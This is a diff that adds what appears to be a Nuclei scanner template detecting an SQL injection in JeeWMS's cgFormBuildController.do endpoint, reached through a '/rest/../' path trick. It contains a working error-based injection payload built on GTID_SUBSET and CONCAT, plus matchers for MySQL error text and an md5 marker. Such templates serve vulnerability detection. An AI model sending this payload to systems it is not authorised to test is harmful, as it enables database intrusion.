@@ -1,0 +1,28 @@
+id: jeewms-cgformbuildcontroller-sqli
+info:
+  name: JeeWMS /rest/../cgFormBuildController.do SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/../cgFormBuildController.do?mobileForm&tableName=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+%28md5%28{{t1}}%29%29%29%2C0xe%29%2C4503%29--+wnMN"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Exception!"
+          - "Malformed GTID set specification"
+          - "错误描述"
+          - "{{t2}}"
